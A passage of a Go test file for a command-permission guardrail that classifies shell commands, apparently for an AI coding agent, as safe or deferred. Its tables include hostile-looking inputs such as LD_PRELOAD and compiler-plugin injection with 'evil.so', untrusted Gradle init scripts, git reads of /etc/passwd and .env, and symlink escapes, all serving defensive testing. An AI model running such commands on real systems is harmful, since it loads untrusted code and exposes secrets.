		{"bazel_repository_cache_external", "bazel build --repository_cache=/tmp/cache //target", false},
		{"bazel_copt_plugin", "bazel build --copt=-fplugin=./evil.so //target", false},
		{"bazel_copt_separated", "bazel build --copt -fplugin=./evil.so //target", false},
		{"bazel_cxxopt_plugin", "bazel build --cxxopt=-fplugin=./evil.so //target", false},
		{"bazel_linkopt_plugin", "bazel build --linkopt=--plugin=evil.so //target", false},
		{"bazel_linkopt_separated", "bazel build --linkopt --plugin=evil.so //target", false},
		{"bazel_python_path", "bazel build --python_path=./runner //target", false},
		{"bazel_action_env", "bazel build --action_env=LD_PRELOAD=./evil.so //target", false},
		{"bazel_host_action_env", "bazel build --host_action_env=EVIL=1 //target", false},
		{"bazel_define", "bazel build --define=FOO=bar //target", false},
		{"bazel_features", "bazel build --features=evil //target", false},

		// Gradlew
		{"gradlew_test", "./gradlew test", true},
		{"gradlew_build", "./gradlew build", true},
		{"gradlew_check", "./gradlew check", true},
		{"gradlew_test_unit", "./gradlew test-unit", true},
		{"gradlew_mixed_case_test_unit", "./gradlew Test-Unit", true},
		{"gradlew_assignment_override", "./gradlew test org.gradle.java.home=./foo-test", false},
		{"gradlew_clean", "./gradlew clean", false},
		{"gradlew_deploy", "./gradlew deploy", false},
		{"gradlew_test_remove", "./gradlew test-remove", false},
		{"gradlew_test_uninstall", "./gradlew test-uninstall", false},
		{"gradlew_mixed_case_release", "./gradlew test-Release", false},
		{"gradlew_quiet_no_target", "./gradlew --quiet", false},
		{"gradlew_exclude_no_target", "./gradlew -x test", false},
		{"gradlew_init_script", "./gradlew -I script.gradle test", false},
		{"gradlew_exclude_assignment_override", "./gradlew -x SHELL=./foo-test test", false},
		// --flag=value forms must also defer
		{"gradlew_init_script_eq", "./gradlew --init-script=/tmp/evil.gradle test", false},
		{"gradlew_unknown_flag", "./gradlew --unknown-flag test", false},

		// External, parent, and nested wrapper paths must defer as direct scripts
		{"gradlew_external", "/tmp/gradlew test", false},
		{"gradlew_parent", "../gradlew test", false},
		{"gradlew_nested", "./untrusted/gradlew test", false},
		{"mvnw_test", "./mvnw test", true},
		{"mvnw_assignment_override", "./mvnw test maven.test.skip=true", false},
		{"mvnw_quiet_no_target", "./mvnw --quiet", false},
		{"mvnw_threads_no_target", "./mvnw -T 2", false},
		{"mvnw_external", "/tmp/mvnw test", false},
		{"mvnw_parent", "../mvnw test", false},
		{"mvnw_test_delete", "./mvnw test-delete", false},
		{"mvnw_test_destroy", "./mvnw test-destroy", false},
		{"mvnw_mixed_case_deploy", "./mvnw verify-Deploy", false},

		// npm/pnpm/yarn scripts
		{"npm_run_build", "npm run build", true},
		{"npm_run_lint", "npm run lint", true},
		{"npm_run_test_unit", "npm run test-unit", true},
		{"npm_run_format", "npm run format", true},
		{"npm_run_deploy", "npm run deploy", false},
		{"npm_run_install", "npm run install", false},
		{"npm_run_test_remove", "npm run test-remove", false},
		{"npm_run_test_uninstall", "npm run test-uninstall", false},
		{"npm_run_mixed_case_test_unit", "npm run Test-Unit", true},
		{"npm_run_mixed_case_publish", "npm run test-Publish", false},
		{"npm_run_preinstall", "npm run preinstall", false},
		{"npm_run_start", "npm run start", false},
		{"npm_run_script", "npm run-script build", true},
		{"npm_run_passthrough", "npm run test -- --grep foo", false},
		{"npm_run_passthrough_silent", "npm run test -- --silent", false},
		{"npm_install", "npm install", false},
		{"npm_exec", "npm exec some-cmd", false},
		{"npx", "npx create-react-app", false},
		{"pnpm_run_build", "pnpm run build", true},
		{"pnpm_run_mixed_case_release", "pnpm run lint-Release", false},
		{"pnpm_run_test_delete", "pnpm run test-delete", false},
		{"pnpm_run_passthrough_quiet", "pnpm run test -- --quiet", false},
		{"pnpm_test", "pnpm test", true},
		{"pnpm_dlx", "pnpm dlx some-cmd", false},
		{"yarn_run_build", "yarn run build", true},
		{"yarn_run_mixed_case_deploy", "yarn run build-Deploy", false},
		{"yarn_run_test_destroy", "yarn run test-destroy", false},
		{"yarn_run_passthrough_verbose", "yarn run test -- --verbose", false},
		{"yarn_test", "yarn test", true},

		// Cargo aliases — unverified external subcommands defer because Cargo
		// may resolve them to shell aliases or arbitrary executables.
		{"cargo_alias_test_unit", "cargo test-unit", false},
		{"cargo_alias_lint_check", "cargo lint-check", false},
		{"cargo_alias_ci_build", "cargo ci_build", false},
		{"cargo_alias_deploy", "cargo deploy", false},
		{"cargo_alias_clean", "cargo clean", false},

		// Buf
		{"buf_generate", "buf generate", true},
		{"buf_lint", "buf lint", true},
		{"buf_format", "buf format", true},
		{"buf_build", "buf build", true},
		{"buf_verify", "buf verify", true},
		{"buf_config", "buf --config buf.yaml lint", false},
		{"buf_unknown", "buf push", false},
		// Strict mode: = forms and unknown flags must defer
		{"buf_template_eq", "buf generate --template=evil.yaml", false},
		{"buf_config_eq", "buf lint --config=evil.yaml", false},
		{"buf_unknown_flag", "buf generate --unknown-flag", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := permission.GuardrailClassify(tt.command, testWorkDir, testWritableRoots)
			if got != tt.want {
				t.Errorf("GuardrailClassify(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestGuardrailClassify_SymlinkPathEscapes(t *testing.T) {
	workDir := t.TempDir()
	externalDir := t.TempDir()
	if err := os.Symlink(externalDir, filepath.Join(workDir, "escape")); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}
	externalFile := filepath.Join(externalDir, "victim.go")
	if err := os.WriteFile(externalFile, []byte("package external\n"), 0o600); err != nil {
		t.Fatalf("write external file: %v", err)
	}
	if err := os.Symlink(externalFile, filepath.Join(workDir, "victim.go")); err != nil {
		t.Skipf("file symlink unavailable: %v", err)
	}
	subdir := filepath.Join(workDir, "subdir")
	if err := os.Mkdir(subdir, 0o700); err != nil {
		t.Fatalf("create subdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(workDir, "changed.go"), []byte("package root\n"), 0o600); err != nil {
		t.Fatalf("write root changed file: %v", err)
	}
	if err := os.Symlink(externalFile, filepath.Join(subdir, "changed.go")); err != nil {
		t.Skipf("changed-directory symlink unavailable: %v", err)
	}

	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"cd_symlink_escape", "cd escape && make test", false},
		{"path_operand_symlink_escape", "go test ./escape/...", false},
		{"output_operand_symlink_escape", "go build -o escape/app ./...", false},
		{"bare_file_operand_symlink_escape", "gofmt -w victim.go", false},
		{"bare_directory_operand_symlink_escape", "prettier --write escape", false},
		{"bare_output_operand_symlink_escape", "go build -o victim.go ./...", false},
		{"changed_directory_file_symlink_escape", "cd subdir && gofmt -w changed.go", false},
		{"safe_created_output_under_root", "go build -o build/app ./...", true},
		{"safe_relative_path_under_root", "go test ./...", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := permission.GuardrailClassify(tt.command, workDir, []string{workDir})
			if got != tt.want {
				t.Errorf("GuardrailClassify(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestGuardrailClassify_Git(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		// Intrinsically local metadata inspection
		{"status", "git status", true},
		{"status_short", "git status --short", true},
		{"status_porcelain", "git status --porcelain", true},
		{"status_branch", "git status -b", true},
		{"ls_files", "git ls-files", true},
		{"rev_parse", "git rev-parse --show-toplevel", true},
		{"rev_parse_short", "git rev-parse --short HEAD", true},
		{"symbolic_ref", "git symbolic-ref HEAD", true},
		{"symbolic_ref_short", "git symbolic-ref --short HEAD", true},
		{"symbolic_ref_set", "git symbolic-ref HEAD refs/heads/other", false},
		{"symbolic_ref_delete", "git symbolic-ref -d HEAD", false},
		{"symbolic_ref_delete_long", "git symbolic-ref --delete HEAD", false},
		{"describe", "git describe --tags", true},
		{"for_each_ref", "git for-each-ref", true},
		{"show_ref", "git show-ref", true},

		// diff, show, log require --no-pager and --no-textconv
		{"diff_no_pager_textconv", "git --no-pager diff --no-textconv", true},
		{"diff_no_pager_textconv_stat", "git --no-pager diff --no-textconv --stat", true},
		{"diff_without_no_pager", "git diff --no-textconv", false},
		{"diff_without_no_textconv", "git --no-pager diff", false},
		{"diff_without_no_textconv_stat", "git --no-pager diff --stat", false},
		{"log_no_pager_textconv", "git --no-pager log --no-textconv --oneline", true},
		{"log_without_no_pager", "git log --no-textconv --oneline", false},
		{"log_without_no_textconv", "git --no-pager log --oneline", false},
		{"show_no_pager_textconv", "git --no-pager show --no-textconv HEAD", true},
		{"show_without_no_pager", "git show --no-textconv HEAD", false},
		{"show_without_no_textconv", "git --no-pager show HEAD", false},

		// External diff/text conversion helpers — enabling forms must defer
		{"diff_ext_diff", "git --no-pager diff --no-textconv --ext-diff", false},
		{"diff_textconv", "git --no-pager diff --no-textconv --textconv", false},
		{"diff_ext_diff_eq", "git --no-pager diff --no-textconv --ext-diff=foo", false},
		// --no-ext-diff is a disabling form and is accepted
		{"diff_no_ext_diff", "git --no-pager diff --no-textconv --no-ext-diff", true},

		// --show-signature invokes GPG helper — must defer
		{"log_show_signature", "git --no-pager log --no-textconv --show-signature", false},
		{"show_signature", "git --no-pager show --no-textconv --show-signature HEAD", false},

		// Config override
		{"config_override", "git -c core.pager=cat diff", false},
		{"git_dir", "git --git-dir /other diff", false},
		{"work_tree", "git --work-tree /other status", false},

		// Branch
		{"branch_list", "git branch --list", true},
		{"branch_all", "git branch -a", true},
		{"branch_verbose", "git branch -vv", true},
		{"branch_show_current", "git branch --show-current", true},
		{"branch_delete", "git branch -d feature", false},
		{"branch_create", "git branch new-branch", false},

		// Remote and mutation
		{"push", "git push", false},
		{"pull", "git pull", false},
		{"fetch", "git fetch", false},
		{"commit", "git commit -m msg", false},
		{"add", "git add .", false},
		{"reset", "git reset --hard", false},
		{"merge", "git merge feature", false},
		{"rebase", "git rebase main", false},
		{"stash", "git stash", false},
		{"remote", "git remote -v", false},
		{"tag", "git tag", false},
		{"config", "git config user.name", false},

		// Sensitive pathspecs and revision:path forms must defer
		{"status_external_path", "git status /etc/passwd", false},
		{"status_sensitive_bare", "git status .env", false},
		{"show_sensitive_revpath", "git --no-pager show --no-textconv HEAD:.env", false},
		{"show_external_revpath", "git --no-pager show --no-textconv HEAD:/etc/passwd", false},
		{"diff_sensitive_path", "git --no-pager diff --no-textconv .env", false},
		{"log_sensitive_path", "git --no-pager log --no-textconv -- .env", false},
		{"ls_files_sensitive", "git ls-files .env", false},

		// Aliases (unknown subcommands)
		{"alias", "git my-alias", false},
		{"unknown_sub", "git foobar", false},

		// No subcommand
		{"no_sub", "git", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := permission.GuardrailClassify(tt.command, testWorkDir, testWritableRoots)
			if got != tt.want {
				t.Errorf("GuardrailClassify(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestGuardrailRedactionAndBounding(t *testing.T) {
	// Secret replacement
	t.Run("secret_replacement", func(t *testing.T) {
		input := "api_key=abc123 command"
		summary := permission.GuardrailBoundSummary(input)
		if strings.Contains(summary, "abc123") {
			t.Errorf("GuardrailBoundSummary did not redact secret: got %q", summary)
		}
		if !strings.Contains(summary, "[redacted]") {
			t.Errorf("GuardrailBoundSummary did not contain [redacted]: got %q", summary)
		}
	})

	// Token replacement
	t.Run("token_replacement", func(t *testing.T) {
		input := "ghp_1234567890abcdef command"
		summary := permission.GuardrailBoundSummary(input)
		if strings.Contains(summary, "ghp_1234567890abcdef") {
			t.Errorf("GuardrailBoundSummary did not redact token: got %q", summary)
		}
	})

	t.Run("secret_keyword_in_attached_flag_defers", func(t *testing.T) {
		for _, command := range []string{
			"gcc -DPASSWORD=hunter2 -c main.c",
			"gcc -DACCESS_TOKEN=hunter2 -c main.c",
			"cppcheck -DAPI_KEY=hunter2 src/",
		} {
			got := permission.GuardrailClassify(command, testWorkDir, testWritableRoots)
			if got {
				t.Errorf("GuardrailClassify(%q) = true, want false", command)
			}
		}
	})

	// Exact-boundary truncation (ASCII)
	t.Run("exact_boundary_truncation", func(t *testing.T) {
		input := strings.Repeat("a", 300)
		summary := permission.GuardrailBoundSummary(input)
		if len(summary) > 240 {
			t.Errorf("GuardrailBoundSummary exceeded limit: got len %d, want <= 240", len(summary))
		}
		if !strings.HasSuffix(summary, "...") {
			t.Errorf("GuardrailBoundSummary missing suffix: got %q", summary[len(summary)-10:])
		}
	})

	// Multibyte-boundary truncation
	t.Run("multibyte_boundary_truncation", func(t *testing.T) {
		// Build a string with multibyte chars near the truncation boundary
		input := strings.Repeat("é", 200)
		summary := permission.GuardrailBoundSummary(input)
		if !utf8.ValidString(summary) {
			t.Errorf("GuardrailBoundSummary produced invalid UTF-8: got %q", summary)
		}
	})

	// Suffix behavior
	t.Run("suffix_behavior", func(t *testing.T) {
		input := strings.Repeat("x", 300)
		summary := permission.GuardrailBoundSummary(input)
		if !strings.HasSuffix(summary, "...") {
			t.Errorf("GuardrailBoundSummary should end with ...: got %q", summary[len(summary)-5:])
		}
	})

	// Short string no truncation
	t.Run("no_truncation_short", func(t *testing.T) {
		input := "go test ./..."
		summary := permission.GuardrailBoundSummary(input)
		if summary != input {
			t.Errorf("GuardrailBoundSummary should not truncate short input: got %q, want %q", summary, input)
		}
	})

	// Invalid UTF-8 deferral
	t.Run("invalid_utf8_deferral", func(t *testing.T) {
		invalid := "go test \xff\xfe ./..."
		got := permission.GuardrailClassify(invalid, testWorkDir, testWritableRoots)
		if got {
			t.Errorf("GuardrailClassify should defer on invalid UTF-8")
		}
	})

	// Over-limit deferral
	t.Run("over_limit_deferral", func(t *testing.T) {
		longCmd := "go test " + strings.Repeat("a", permission.GuardrailMaxCommandLen)
		got := permission.GuardrailClassify(longCmd, testWorkDir, testWritableRoots)
		if got {
			t.Errorf("GuardrailClassify should defer on over-limit command (len %d)", len(longCmd))
		}
	})

	// Over-limit does not classify truncated prefix
	t.Run("over_limit_no_truncated_classification", func(t *testing.T) {
		// A command that would be eligible if truncated, but exceeds the limit
		longCmd := "go test ./... " + strings.Repeat("a", permission.GuardrailMaxCommandLen)
		got := permission.GuardrailClassify(longCmd, testWorkDir, testWritableRoots)
		if got {
			t.Errorf("GuardrailClassify should not classify truncated prefix of over-limit command")
		}
	})
}
